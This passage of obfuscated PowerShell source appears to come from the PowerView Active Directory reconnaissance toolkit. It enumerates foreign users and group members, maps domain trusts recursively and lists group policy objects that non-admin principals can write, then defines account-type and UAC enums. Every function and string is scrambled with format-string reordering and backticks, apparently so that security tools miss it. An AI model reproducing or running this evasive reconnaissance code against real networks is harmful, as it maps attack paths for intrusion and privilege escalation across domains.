        if (${p`sBO`UNDPaR`AMeteRS}[("{1}{0}{2}" -f 'Siz','ResultPage','e')]) { ${SEa`R`chErARg`UM`EnTs}[("{1}{2}{3}{0}"-f'eSize','Re','sult','Pag')] = ${re`s`ULt`P`AGESize} }
        if (${PsbOU`N`d`PA`R`AMeteRS}[("{2}{0}{4}{3}{1}" -f'erv','it','S','imeLim','erT')]) { ${S`EARChERaRGUme`N`TS}[("{0}{1}{2}{4}{3}"-f'Ser','v','erTime','it','Lim')] = ${Se`R`VeRTIme`lImiT} }
        if (${psb`OUNd`PaRaM`ET`E`Rs}[("{2}{1}{0}" -f'Masks','rity','Secu')]) { ${SEA`R`CHER`AR`gum`eNTs}[("{2}{0}{3}{1}" -f 'ecur','tyMasks','S','i')] = ${s`EC`URit`YMAsKs} }
        if (${P`sb`ou`N`dP`ARAmEterS}[("{1}{0}{3}{2}" -f 'mb','To','e','ston')]) { ${sEA`R`cHerA`RgumeNTS}[("{0}{3}{1}{2}"-f 'To','ston','e','mb')] = ${t`omBStO`NE} }
        if (${P`s`Boun`dparAM`EtE`Rs}[("{2}{1}{0}"-f'al','ti','Creden')]) { ${S`EaRcHEr`ARGuMe`NTS}[("{1}{2}{0}"-f'l','Cr','edentia')] = ${C`RedentI`Al} }
        if (${p`SBoU`NDPAraME`Te`Rs}['Raw']) { ${sEaR`Ch`ErARG`U`menTS}['Raw'] = ${R`AW} }
    }

    PROCESS {
        &("{3}{0}{2}{1}"-f 'o','nUser','mai','Get-D') @SearcherArguments  | &("{1}{4}{0}{2}{3}"-f'-O','ForEac','bjec','t','h') {
            ForEach (${ME`mbE`R`SHIP} in ${_}."meMbE`R`OF") {
                ${i`NdEx} = ${mEM`BeRS`H`iP}.("{1}{2}{0}"-f'xOf','I','nde').Invoke('DC=')
                if (${i`NDEX}) {

                    ${gr`ou`PDOmAin} = $(${m`eM`BerSHip}.("{1}{0}{2}" -f 'i','SubStr','ng').Invoke(${INd`Ex})) -replace 'DC=','' -replace ',','.'
                    ${US`Er`DiSt`iNGuiSH`Ed`Na`mE} = ${_}."D`iST`In`guiShEdNaMe"
                    ${u`SEr`INDEx} = ${usER`d`I`S`TINg`UIshEDNA`Me}.("{0}{1}" -f'Index','Of').Invoke('DC=')
                    ${Us`e`RDOM`AIN} = $(${_}."di`stiN`g`UIShedn`AMe".("{1}{2}{0}" -f'String','Su','b').Invoke(${uSeR`i`NDex})) -replace 'DC=','' -replace ',','.'

                    if (${GROu`pdo`MAin} -ne ${use`Rdom`AiN}) {
                        
                        ${G`ROupNA`ME} = ${M`emB`e`RSHiP}.("{1}{0}" -f't','Spli').Invoke(',')[0].("{1}{0}" -f'lit','sp').Invoke('=')[1]
                        ${fO`R`EigNuSer} = &("{0}{2}{1}"-f'New-','ject','Ob') ("{0}{2}{1}" -f'P','Object','S')
                        ${fo`REIgN`UsER} | &("{1}{2}{0}" -f'ember','Add','-M') ("{0}{1}{2}{3}" -f 'Notep','ro','per','ty') ("{1}{0}{2}" -f'om','UserD','ain') ${Us`Er`DomaIn}
                        ${fORe`i`GNUser} | &("{2}{0}{1}" -f 'd-Membe','r','Ad') ("{1}{2}{3}{0}" -f 'ty','No','tep','roper') ("{2}{1}{0}"-f 'me','rNa','Use') ${_}."sAM`AcCoUNtN`AMe"
                        ${for`e`iG`NUsER} | &("{1}{0}{2}"-f'M','Add-','ember') ("{3}{0}{1}{2}" -f 'ope','r','ty','Notepr') ("{2}{3}{1}{5}{0}{4}"-f'dNa','gu','UserDi','stin','me','ishe') ${_}."d`iST`ing`Uis`HEdnaME"
                        ${FoREiG`NU`seR} | &("{3}{2}{1}{0}"-f 'mber','e','dd-M','A') ("{2}{1}{0}"-f 'perty','otepro','N') ("{0}{1}{2}{3}" -f 'Gro','up','Doma','in') ${G`RoUPdO`m`AiN}
                        ${foReI`G`NusEr} | &("{1}{3}{2}{0}"-f'er','A','-Memb','dd') ("{0}{1}{2}"-f 'Notepr','op','erty') ("{3}{0}{1}{2}" -f'u','p','Name','Gro') ${GRoU`PN`A`Me}
                        ${f`orei`GNuSeR} | &("{1}{0}{2}"-f'-Me','Add','mber') ("{1}{3}{2}{0}"-f 'erty','Notepr','p','o') ("{4}{1}{2}{3}{0}{5}" -f'Na','pD','istinguishe','d','Grou','me') ${MEM`BeRs`hIP}
                        ${For`E`IgNU`seR}."Ps`oBJEct"."TY`PENAMes".("{0}{2}{1}"-f'In','ert','s').Invoke(0, ("{1}{3}{5}{2}{0}{4}"-f 'Fo','Po','View.','w','reignUser','er'))
                        ${F`oReIg`N`UsER}
                    }
                }
            }
        }
    }
}


function Get-`d`oMaINFOREig`N`gr`ouPMEM`Ber {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{2}{1}{0}{4}" -f 'c','uldPro','o','PSSh','ess'}, '')]
    [OutputType({"{2}{1}{5}{4}{0}{3}"-f 'Memb','werView.Fore','Po','er','p','ignGrou'})]
    [CmdletBinding()]
    Param(
        [Parameter(posItiOn = 0, ValUEFromPiPELinE = ${tr`Ue}, vaLUEfrOmpIPELiNEBYProPeRTYnamE = ${t`Rue})]
        [Alias({"{0}{1}"-f 'Nam','e'})]
        [ValidateNotNullOrEmpty()]
        [String]
        ${DO`MA`iN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'ter','Fil'})]
        [String]
        ${ld`A`P`Filter},

        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PROPe`RTi`eS},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f'h','Pat','ADS'})]
        [String]
        ${sE`AR`CHbAse},

        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{4}{3}{0}{1}{5}"-f'r','o','DomainC','nt','o','ller'})]
        [String]
        ${SER`V`ER},

        [ValidateSet({"{0}{1}"-f 'Ba','se'}, {"{0}{1}" -f 'OneLe','vel'}, {"{1}{0}"-f'btree','Su'})]
        [String]
        ${S`e`Ar`cHscOpE} = ("{1}{0}{2}" -f'r','Subt','ee'),

        [ValidateRange(1, 10000)]
        [Int]
        ${ResULt`PAgE`S`i`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${se`RV`eR`TImeLImiT},

        [ValidateSet({"{0}{1}" -f'Dac','l'}, {"{0}{1}"-f 'Gr','oup'}, {"{1}{0}" -f'one','N'}, {"{0}{1}"-f'Owne','r'}, {"{1}{0}" -f'l','Sac'})]
        [String]
        ${SE`cUriTyMA`sks},

        [Switch]
        ${t`OMb`S`TONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cR`eD`EN`TIAL} =  $0dSqr::"E`Mpty"
    )

    BEGIN {
        ${sE`AR`Ch`erA`RguMents} = @{}
        ${S`Ear`CheR`ARg`U`Ments}[("{0}{2}{1}"-f'LDAPFil','r','te')] = ("{0}{1}{2}{3}"-f'(me','m','ber=*',')')
        if (${PSB`ou`NDPa`R`AmEt`ERs}[("{0}{1}"-f 'Do','main')]) { ${SEA`RchEra`Rg`Um`E`NTS}[("{1}{0}" -f 'in','Doma')] = ${dO`MA`in} }
        if (${p`S`BO`UnD`paRam`eTerS}[("{2}{1}{0}"-f's','ie','Propert')]) { ${s`EaRcHErA`Rg`U`Men`TS}[("{1}{0}{2}"-f 'roper','P','ties')] = ${P`R`oP`eRTiES} }
        if (${pSBounD`pARa`M`e`TErS}[("{2}{0}{1}" -f 'Bas','e','Search')]) { ${Sea`RchER`Ar`gUM`enTS}[("{0}{3}{2}{1}" -f'Sea','e','hBas','rc')] = ${s`E`ArcH`BaSE} }
        if (${Psboun`DP`ARaM`et`Ers}[("{1}{2}{0}" -f 'r','Ser','ve')]) { ${SeA`RC`H`ERarGume`N`TS}[("{0}{1}"-f 'Se','rver')] = ${serv`eR} }
        if (${PsBOundPa`RAM`e`T`ERs}[("{2}{1}{0}"-f 'cope','archS','Se')]) { ${S`EarcH`erA`RGumEn`Ts}[("{2}{1}{0}"-f 'e','hScop','Searc')] = ${s`E`ArcHSCO`pE} }
        if (${P`S`Bo`UnD`pa`RAMETERs}[("{1}{3}{2}{0}" -f'ze','Resul','eSi','tPag')]) { ${Se`ARCh`E`RaRgum`entS}[("{1}{0}{2}" -f 'tPageSiz','Resul','e')] = ${REsuLT`PA`G`ES`iZe} }
        if (${P`SBOUn`DPARame`Te`Rs}[("{0}{2}{1}"-f 'Serve','it','rTimeLim')]) { ${sE`Ar`CheRarg`UMents}[("{2}{1}{3}{0}" -f 'imit','rverTim','Se','eL')] = ${SERverT`im`Eli`M`it} }
        if (${psBoUn`dPa`R`AmetE`RS}[("{0}{1}{2}{3}"-f 'Se','cu','rity','Masks')]) { ${se`Arch`e`R`ARGUments}[("{2}{3}{1}{0}"-f's','sk','S','ecurityMa')] = ${sEcURI`TYm`As`kS} }
        if (${Psb`OUNdp`A`Ra`METers}[("{0}{1}" -f'Tombsto','ne')]) { ${S`ear`c`heRaRG`UMen`TS}[("{0}{1}{2}" -f'To','mbsto','ne')] = ${TOmb`s`TO`NE} }
        if (${PSB`o`U`NdP`AraME`TERS}[("{0}{1}{2}" -f'C','reden','tial')]) { ${S`Ea`RC`HeRar`gUM`eNTS}[("{0}{2}{1}" -f'Cre','l','dentia')] = ${cr`EDEN`Ti`AL} }
        if (${psBouND`Par`AM`E`TeRs}['Raw']) { ${sE`A`RchER`ArGumE`Nts}['Raw'] = ${r`AW} }
    }

    PROCESS {
        
        ${ExC`L`Ude`G`ROUpS} = @(("{1}{0}"-f 'sers','U'), ("{3}{0}{2}{1}"-f 'o','Users','main ','D'), ("{0}{1}" -f'Gues','ts'))

        &("{3}{2}{0}{1}"-f 'Grou','p','in','Get-Doma') @SearcherArguments | &("{0}{2}{1}" -f 'Whe','ct','re-Obje') { ${exclu`d`eg`ROu`ps} -notcontains ${_}."samA`c`COunTNaMe" } | &("{0}{2}{3}{1}" -f'Fo','ect','r','Each-Obj') {
            ${grOU`PNa`ME} = ${_}."S`A`mAcCOuNTN`A`me"
            ${grO`UpDisti`NG`UISh`EDnAMe} = ${_}."DI`sTInguiS`HED`NA`mE"
            ${g`R`oup`doMain} = ${Gr`ouPDIST`iNGu`ISHe`dn`A`mE}.("{1}{2}{0}"-f 'String','S','ub').Invoke(${GrO`U`p`dIStin`gU`i`shEdnAME}.("{1}{0}" -f'dexOf','In').Invoke('DC=')) -replace 'DC=','' -replace ',','.'

            ${_}."Mem`Ber" | &("{3}{2}{0}{1}" -f 'h-Objec','t','Eac','For') {
                
                
                ${membeR`Do`m`Ain} = ${_}.("{1}{2}{0}"-f 'ring','S','ubSt').Invoke(${_}.("{0}{1}"-f 'I','ndexOf').Invoke('DC=')) -replace 'DC=','' -replace ',','.'
                if ((${_} -match ("{4}{2}{3}{0}{1}" -f '-21.*','-.*','=S','-1-5','CN')) -or (${group`dOM`AiN} -ne ${M`embErDoM`AiN})) {
                    ${mEmBe`RDI`s`TInGuisHE`dnA`mE} = ${_}
                    ${me`m`BerNaME} = ${_}.("{0}{1}"-f 'Spl','it').Invoke(',')[0].("{0}{1}" -f's','plit').Invoke('=')[1]

                    ${f`OreI`gNgrOuPmE`MB`Er} = &("{1}{2}{0}"-f 'w-Object','N','e') ("{0}{1}" -f'PSObj','ect')
                    ${FO`REi`gnG`Ro`UPMembER} | &("{2}{3}{1}{0}" -f 'r','d-Membe','A','d') ("{1}{0}{2}"-f 'e','Not','property') ("{2}{1}{0}"-f'in','ma','GroupDo') ${GroU`PD`OM`Ain}
                    ${foR`EIG`NG`ROU`pmEmbEr} | &("{0}{3}{2}{1}"-f 'A','r','-Membe','dd') ("{1}{0}{2}{3}"-f 'ope','Notepr','rt','y') ("{0}{1}"-f 'Gro','upName') ${g`R`OUpNAme}
                    ${FoRe`i`g`N`gRoUPme`MbeR} | &("{2}{1}{0}" -f 'er','Memb','Add-') ("{1}{2}{0}" -f'y','Notep','ropert') ("{3}{4}{5}{2}{0}{1}{6}"-f 'gu','ish','n','Gr','oupDis','ti','edName') ${GRoUpDi`sT`In`Gu`isHEdN`Ame}
                    ${fOrEi`GNGR`o`Upm`emBEr} | &("{1}{0}{2}" -f '-Mem','Add','ber') ("{1}{0}{2}" -f 'epro','Not','perty') ("{1}{2}{0}"-f 'erDomain','Me','mb') ${meMbe`R`DOm`AIN}
                    ${FOr`Ei`Gng`ROUPm`EmbEr} | &("{1}{2}{0}"-f'mber','Add-M','e') ("{0}{3}{1}{2}"-f 'No','ert','y','teprop') ("{3}{1}{2}{0}" -f'e','be','rNam','Mem') ${mEMb`e`RNa`me}
                    ${forei`GnG`Ro`U`Pm`EmbER} | &("{0}{2}{1}" -f 'Ad','Member','d-') ("{2}{1}{0}{3}" -f 'ep','ot','N','roperty') ("{2}{3}{0}{4}{1}" -f 'ing','dName','M','emberDist','uishe') ${MEm`B`erdistINguisHe`d`NAMe}
                    ${FOREiGNGRo`U`Pmem`BeR}."Ps`obJEcT"."typ`E`NAMes".("{0}{1}"-f'In','sert').Invoke(0, ("{4}{2}{3}{5}{0}{1}"-f 'ou','pMember','iew.Forei','g','PowerV','nGr'))
                    ${f`oreI`g`NgRouPm`EMBEr}
                }
            }
        }
    }
}


function GET-D`oMAinTR`US`TMAPP`inG {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{2}{0}{1}" -f 'houldProces','s','PSS'}, '')]
    [OutputType({"{3}{0}{1}{4}{2}" -f'View.D','omainTrust.N','T','Power','E'})]
    [OutputType({"{5}{1}{3}{2}{6}{0}{4}" -f'Trust.LD','View','mai','.Do','AP','Power','n'})]
    [OutputType({"{6}{2}{1}{0}{3}{5}{4}"-f 'erView.D','w','o','omain','I','Trust.AP','P'})]
    [CmdletBinding(DefaUlTPArAmeTErseTNAMe = {"{0}{1}"-f'L','DAP'})]
    Param(
        [Parameter(ParameTErsetNaMe = 'API')]
        [Switch]
        ${a`Pi},

        [Parameter(pAraMEterSETname = 'NET')]
        [Switch]
        ${N`eT},

        [Parameter(PArAmeTErsETnaMe = "l`Dap")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}" -f'ilter','F'})]
        [String]
        ${LDap`FiL`TEr},

        [Parameter(paRaMETeRsetnaMe = "L`daP")]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PRO`pE`RtIeS},

        [Parameter(pARAmEteRsEtname = "Ld`AP")]
        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{2}{0}" -f'th','ADSP','a'})]
        [String]
        ${SE`Arch`B`ASE},

        [Parameter(pARAMETersETNamE = "L`dap")]
        [Parameter(paramEtERseTnaMe = 'API')]
        [ValidateNotNullOrEmpty()]
        [Alias({"{2}{1}{0}" -f 'nController','i','Doma'})]
        [String]
        ${s`ervER},

        [Parameter(PARAMetErsEtname = "Ld`AP")]
        [ValidateSet({"{0}{1}"-f'Bas','e'}, {"{1}{0}{2}"-f 'Lev','One','el'}, {"{1}{0}"-f 'e','Subtre'})]
        [String]
        ${sE`Archs`C`OpE} = ("{1}{0}"-f 'ee','Subtr'),

        [Parameter(ParamEtErSEtNAME = "LD`AP")]
        [ValidateRange(1, 10000)]
        [Int]
        ${ReSUl`Tpa`ge`s`Ize} = 200,

        [Parameter(pARaMETeRseTNAme = "L`DAp")]
        [ValidateRange(1, 10000)]
        [Int]
        ${SERvErt`I`mE`lImIt},

        [Parameter(PaRameTERSeTnAMe = "ld`Ap")]
        [Switch]
        ${tomBs`T`OnE},

        [Parameter(PARaMEtersETNAme = "L`DaP")]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crEDEn`TI`AL} =   ( GcI  VARiaBle:0DSqR ).VALUE::"e`mPtY"
    )

    
    ${s`EENd`OmaINs} = @{}

    
    ${dom`AI`Ns} = &("{1}{0}{2}" -f'j','New-Ob','ect') ("{0}{1}{2}{4}{3}" -f 'S','ystem.Coll','ect','k','ions.Stac')

    ${DO`mAInt`R`USt`A`RgU`menTs} = @{}
    if (${P`SBOUNdP`ArA`MEteRs}['API']) { ${Do`m`AintR`U`Star`gumENTs}['API'] = ${a`PI} }
    if (${pSB`OUN`DP`ARAM`Eters}['NET']) { ${DoMa`Int`RuSTA`RG`Ume`N`Ts}['NET'] = ${N`eT} }
    if (${ps`BOU`NDPAR`AMe`TerS}[("{2}{1}{0}" -f 'lter','i','LDAPF')]) { ${d`O`mAiN`Tr`UsTaRgu`M`Ents}[("{2}{1}{0}"-f'PFilter','DA','L')] = ${lDAp`FIl`TeR} }
    if (${p`S`BOundp`AraMEt`eRS}[("{3}{0}{2}{1}"-f'rop','ies','ert','P')]) { ${DO`MaintRUsTArG`U`meN`Ts}[("{0}{2}{1}" -f'P','rties','rope')] = ${pRO`PerT`I`Es} }
    if (${PsBo`Un`DpAra`meTERs}[("{2}{0}{1}" -f 'chB','ase','Sear')]) { ${DO`mai`NT`Rusta`RGu`me`NTs}[("{2}{0}{1}"-f'c','hBase','Sear')] = ${se`Ar`ch`BASe} }
    if (${psb`OuNdp`AramE`TE`RS}[("{1}{0}"-f 'rver','Se')]) { ${DOMaiNtRUStAr`gu`M`en`TS}[("{0}{1}{2}" -f 'Se','r','ver')] = ${s`eR`Ver} }
    if (${ps`BOUnD`PAr`A`MetERs}[("{2}{0}{1}" -f'hScop','e','Searc')]) { ${domainT`RusTARGumE`N`Ts}[("{1}{0}{2}"-f 'hSco','Searc','pe')] = ${S`EARCHs`cope} }
    if (${PSBO`U`NDpAra`meTErs}[("{0}{1}{2}" -f'Resu','ltPage','Size')]) { ${DOMa`INTRUS`T`ARgU`m`E`NtS}[("{3}{0}{2}{1}"-f 'age','ize','S','ResultP')] = ${R`EsuL`TpA`gESIze} }
    if (${psb`O`UN`DPar`Amete`Rs}[("{1}{0}{3}{2}" -f'v','Ser','rTimeLimit','e')]) { ${DO`MaI`NTR`USt`ArGumENTS}[("{0}{1}{2}{4}{3}"-f'Se','rv','e','mit','rTimeLi')] = ${seRveR`Ti`meliM`It} }
    if (${psbOUn`DpaR`AmET`e`Rs}[("{1}{0}{2}{3}"-f 'ombs','T','t','one')]) { ${dOmaIntr`US`T`ARGu`M`ENTS}[("{2}{0}{3}{1}" -f'o','ne','T','mbsto')] = ${TOMbs`T`oNE} }
    if (${pSbOUND`PAr`A`mEters}[("{2}{1}{0}" -f 'ntial','de','Cre')]) { ${Do`MAIn`TRusTaRG`UMeN`TS}[("{1}{0}{2}"-f'i','Credent','al')] = ${c`REDent`IAl} }

    
    if (${PsB`O`UnDP`A`RaMETeRS}[("{0}{1}{2}" -f'Creden','tia','l')]) {
        ${c`URRe`NTDomAIn} = (&("{1}{0}{2}{3}"-f 't-','Ge','D','omain') -Credential ${C`R`eDEN`TIaL})."na`mE"
    }
    else {
        ${Cur`RENTDom`AiN} = (&("{0}{2}{1}"-f'Get-D','main','o'))."N`Ame"
    }
    ${dOm`A`iNs}.("{1}{0}" -f'h','Pus').Invoke(${cur`R`E`NtD`OMAIN})

    while(${do`mai`NS}."Co`UNT" -ne 0) {

        ${d`OmA`IN} = ${D`OMaiNS}.("{0}{1}" -f 'Po','p').Invoke()

        
        if (${DO`m`Ain} -and (${DoM`AIN}.("{0}{1}"-f'T','rim').Invoke() -ne '') -and (-not ${s`e`ENDO`mainS}.("{3}{1}{0}{2}" -f 'in','ta','sKey','Con').Invoke(${do`Ma`IN}))) {

            &("{2}{0}{1}" -f 'b','ose','Write-Ver') ('[Get'+'-'+'Dom'+'ainTrustMa'+'pping] '+'Enu'+'meratin'+'g '+'t'+'rusts '+'for'+' '+'dom'+'ain:'+' '+"'$Domain'")

            
            ${n`Ull} = ${s`eeNDom`AI`Ns}.("{1}{0}" -f'dd','A').Invoke(${d`Om`AiN}, '')

            try {
                
                ${DoMAi`N`TRUStArGumE`NtS}[("{0}{1}"-f'Dom','ain')] = ${dO`MAIn}
                ${TrUS`TS} = &("{2}{1}{3}{4}{0}" -f 't','t-Dom','Ge','ai','nTrus') @DomainTrustArguments

                if (${Tru`sTs} -isnot [System.Array]) {
                    ${tR`U`sTs} = @(${truS`Ts})
                }

                
                if (${p`scm`dlet}.PaRAMETeRsetname -eq 'NET') {
                    ${F`oRe`stT`RUS`TaRg`UMENTS} = @{}
                    if (${psboUNd`P`Ar`Am`eTeRs}[("{1}{2}{0}"-f 't','F','ores')]) { ${For`EsTtR`UStAR`gUME`NtS}[("{2}{1}{0}"-f'est','r','Fo')] = ${f`OR`est} }
                    if (${pS`Bo`UNdPaRa`mEters}[("{1}{2}{0}"-f 'tial','C','reden')]) { ${ForE`sTtrust`Ar`gu`M`ENtS}[("{2}{0}{1}" -f'edent','ial','Cr')] = ${CReDE`Nt`ial} }
                    ${t`RUSTs} += &("{3}{2}{1}{0}"-f 'st','tTru','Fores','Get-') @ForestTrustArguments
                }

                if (${tRu`s`Ts}) {
                    if (${tRuS`TS} -isnot [System.Array]) {
                        ${T`RU`STS} = @(${tR`Us`TS})
                    }

                    
                    ForEach (${Tr`USt} in ${tRu`sTS}) {
                        if (${tr`U`st}."SourC`EN`AME" -and ${Tr`Ust}."tArg`E`TNAMe") {
                            
                            ${N`ULL} = ${dom`A`INS}.("{0}{1}" -f'Pu','sh').Invoke(${TR`UsT}."taR`gE`TNAmE")
                            ${TR`U`sT}
                        }
                    }
                }
            }
            catch {
                &("{1}{2}{0}" -f'-Verbose','W','rite') ('['+'Get-'+'DomainTru'+'stM'+'apping] '+'Erro'+'r: '+"$_")
            }
        }
    }
}


function gET-gPODele`gA`Ti`On {


    [CmdletBinding()]
    Param (
        [String]
        ${G`p`ONAME} = '*',

        [ValidateRange(1,10000)] 
        [Int]
        ${paGEsi`ze} = 200
    )

    ${EXC`LU`siO`NS} = @(("{0}{1}{2}"-f 'SYS','T','EM'),("{2}{1}{0}" -f 'ins','omain Adm','D'),("{3}{4}{2}{1}{5}{0}"-f'ise Admins','rp','e','E','nt','r'))

    ${Fo`RESt} =  $BY3QhU::("{3}{0}{1}{2}" -f'etCur','rentFore','st','G').Invoke()
    ${dOMAi`Nl`Ist} = @(${Fo`R`eSt}."DOma`INS")
    ${Doma`I`Ns} = ${dOmA`i`N`lIsT} | &("{1}{0}"-f 'reach','fo') { ${_}.("{4}{3}{1}{2}{0}{5}" -f 'ryEntr','D','irecto','et','G','y').Invoke() }
    foreach (${DomA`iN} in ${D`O`mAinS}) {
        ${f`IlT`eR} = "(&(objectCategory=groupPolicyContainer)(displayname=$GPOName))"
        ${SeARc`hEr} = &("{2}{3}{0}{1}" -f 'jec','t','N','ew-Ob') ("{2}{4}{11}{8}{7}{5}{1}{9}{6}{10}{0}{3}" -f'he','ices.Direc','System.Di','r','r','rv','ySe','rySe','o','tor','arc','ect')
        ${SE`A`RCher}."SEArChr`o`OT" = ${dO`ma`in}
        ${S`ea`RCHEr}."FIlT`er" = ${F`IL`TER}
        ${Sea`Rc`hER}."pa`gESI`zE" = ${pAg`esI`ze}
        ${sEARC`HEr}."SeAr`cH`S`COpe" = ("{1}{0}{2}" -f'tre','Sub','e')
        ${L`i`stgpO} = ${se`ArCH`Er}.("{1}{0}" -f 'l','FindAl').Invoke()
        foreach (${G`PO} in ${lIS`Tg`po}){
            ${a`cL} = ([ADSI]${G`pO}."p`ATH")."oBJ`ecT`secU`RiTy"."A`cCESs" | &('?') {${_}."a`c`T`iVE`DIr`ecTOryR`IGHtS" -match ("{1}{0}" -f'e','Writ') -and ${_}."ACCes`s`conTrOLTY`PE" -eq ("{0}{1}" -f 'A','llow') -and  ${eX`cl`UsioNS} -notcontains ${_}."IDeNTi`T`yRe`FErEn`ce".("{1}{2}{0}"-f 'g','t','oStrin').Invoke().("{0}{1}"-f 'sp','lit').Invoke("\")[1] -and ${_}."IdenT`ITYREf`e`RENce" -ne ("{1}{2}{3}{0}"-f'NER','C','REATO','R OW')}
        if (${a`CL} -ne ${NU`lL}){
            ${gPo`AcL} = &("{0}{1}{3}{2}" -f'New-Obj','e','t','c') ("{2}{1}{0}"-f 'object','s','p')
            ${g`p`oacL} | &("{0}{2}{1}{3}"-f 'Ad','em','d-M','ber') ("{0}{1}{2}"-f 'Note','pr','operty') ("{0}{1}" -f'ADSPa','th') ${G`PO}."prOPE`RT`iES"."ad`sP`Ath"
            ${g`pOacL} | &("{1}{0}{2}"-f'd-','Ad','Member') ("{2}{0}{1}"-f'prop','erty','Note') ("{0}{3}{2}{1}"-f'GPODis','ame','layN','p') ${g`pO}."pR`o`p`ERTIeS"."dISPLa`Y`NamE"
            ${GpOA`cl} | &("{1}{2}{0}"-f'Member','A','dd-') ("{0}{2}{1}"-f'Note','erty','prop') ("{4}{2}{3}{0}{1}"-f'tyReferenc','e','ent','i','Id') ${A`cl}."IDE`NTI`TYREfere`Nce"
            ${G`POaCl} | &("{0}{1}{2}"-f'Add-','Memb','er') ("{3}{0}{1}{2}" -f 't','e','property','No') ("{3}{0}{4}{1}{2}{5}"-f'ive','ire','ctoryRi','Act','D','ghts') ${a`CL}."actiV`EDiRe`cTO`Ryri`ghTS"
            ${GPoA`cl}
        }
        }
    }
}











${M`OD} = &("{1}{3}{2}{4}{0}" -f 'e','Ne','MemoryModu','w-In','l') -ModuleName ("{1}{0}"-f'in32','W')




${SAMACcO`UntT`Yp`eE`Num} = &("{0}{1}{2}" -f'p','s','enum') ${m`od} ("{2}{3}{1}{4}{5}{0}{6}"-f 'peEnu','er','Po','w','V','iew.SamAccountTy','m') ("{1}{0}"-f 'Int32','U') @{
    ("{2}{1}{0}" -f '_OBJECT','N','DOMAI')                   =   ("{3}{0}{1}{2}"-f '00','0','000','0x00')
    ("{3}{0}{2}{1}"-f 'ROUP_','T','OBJEC','G')                    =   ("{0}{2}{1}"-f '0x1','000','0000')
    ("{3}{4}{2}{1}{0}{6}{5}" -f'_O','UP','GRO','NON_SECU','RITY_','JECT','B')       =   ("{3}{2}{1}{0}" -f '01','000','0','0x10')
    ("{1}{0}{2}" -f 'LIAS_O','A','BJECT')                    =   ("{1}{2}{0}"-f '0000','0x','2000')
    ("{2}{4}{1}{0}{3}"-f 'JE','URITY_ALIAS_OB','NON','CT','_SEC')       =   ("{2}{1}{0}"-f '20000001','x','0')
    ("{2}{0}{1}{3}" -f'O','BJEC','USER_','T')                     =   ("{2}{0}{1}"-f '0','00000','0x30')
    ("{3}{2}{1}{0}{4}" -f'E','N','CHI','MA','_ACCOUNT')                 =   ("{1}{3}{0}{2}"-f'0','0x3','0001','00')
    ("{1}{0}{2}" -f 'CCO','TRUST_A','UNT')                   =   ("{0}{2}{1}"-f'0x','002','30000')
    ("{2}{1}{0}" -f 'ASIC_GROUP','B','APP_')                 =   ("{2}{0}{1}" -f'x40000','000','0')
    ("{3}{0}{1}{2}"-f 'Y_','GR','OUP','APP_QUER')                 =   ("{2}{0}{1}" -f '0000','1','0x400')
    ("{1}{3}{0}{2}"-f'A','A','X','CCOUNT_TYPE_M')                =   ("{0}{2}{1}" -f '0x7fffff','f','f')
}


${G`R`OuptYp`EEN`Um} = &("{2}{0}{1}"-f 'en','um','ps') ${M`OD} ("{4}{3}{5}{1}{0}{2}" -f 'nu','eE','m','pTy','PowerView.Grou','p') ("{1}{2}{0}" -f 't32','U','In') @{
    ("{4}{0}{1}{2}{3}" -f 'REATE','D_BY','_','SYSTEM','C')               =   ("{0}{2}{1}" -f '0x','001','00000')
    ("{0}{1}{2}" -f'GLOB','A','L_SCOPE')                    =   ("{0}{3}{1}{2}" -f'0x00','00','2','000')
    ("{1}{4}{0}{2}{3}" -f 'OC','D','AL_SCOP','E','OMAIN_L')              =   ("{0}{2}{1}" -f '0x0000','4','000')
    ("{3}{4}{1}{2}{0}" -f 'PE','VERSAL_S','CO','U','NI')                 =   ("{2}{0}{1}"-f '0','008','0x0000')
    ("{1}{2}{0}"-f'C','APP_','BASI')                       =   ("{0}{1}{2}" -f '0','x','00000010')
    ("{2}{1}{0}" -f '_QUERY','P','AP')                       =   ("{0}{1}{2}" -f'0x0','0','000020')
    ("{0}{1}"-f'SECU','RITY')                        =   ("{0}{2}{1}"-f '0x','000000','80')
} -Bitfield


${uaCEN`Um} = &("{1}{0}"-f 'um','psen') ${M`OD} ("{4}{1}{2}{0}{3}" -f 'A','we','rView.U','CEnum','Po') ("{0}{1}{2}"-f'U','I','nt32') @{
    ("{1}{0}"-f 'CRIPT','S')                          =   1
    ("{0}{1}{2}{3}"-f 'ACCO','UNT','DISAB','LE')                  =   2
    ("{3}{2}{1}{0}" -f 'QUIRED','DIR_RE','ME','HO')                =   8
    ("{2}{0}{1}"-f'CK','OUT','LO')                         =   16
    ("{3}{1}{2}{0}"-f'EQD','A','SSWD_NOTR','P')                  =   32
    ("{0}{3}{1}{2}" -f 'PASSWD','ANT_CH','ANGE','_C')              =   64
    ("{2}{3}{0}{4}{1}{5}"-f 'D_TEXT_P','D','E','NCRYPTE','W','_ALLOWED')      =   128
    ("{0}{2}{3}{4}{1}" -f'TE','E_ACCOUNT','MP_DUP','LIC','AT')          =   256
    ("{1}{2}{0}{3}" -f'CCOUN','NORMA','L_A','T')                  =   512
    ("{0}{2}{4}{3}{1}" -f'INT','NT','ER','OU','DOMAIN_TRUST_ACC')       =   2048
    ("{5}{1}{3}{2}{7}{6}{4}{0}" -f 'T','RKST','TIO','A','UN','WO','T_ACCO','N_TRUS')       =   4096
    ("{1}{0}{4}{3}{2}" -f '_TRUS','SERVER','T','_ACCOUN','T')            =   8192
    ("{0}{2}{3}{5}{4}{1}" -f'DO','D','NT_EXPIRE','_','R','PASSWO')            =   65536
    ("{1}{0}{3}{2}" -f'NS_LOGON_AC','M','T','COUN')               =   131072
    ("{3}{1}{2}{0}" -f 'RED','MARTCAR','D_REQUI','S')              =   262144
    ("{4}{2}{0}{3}{1}" -f 'D_FO','N','E','R_DELEGATIO','TRUST')          =   524288
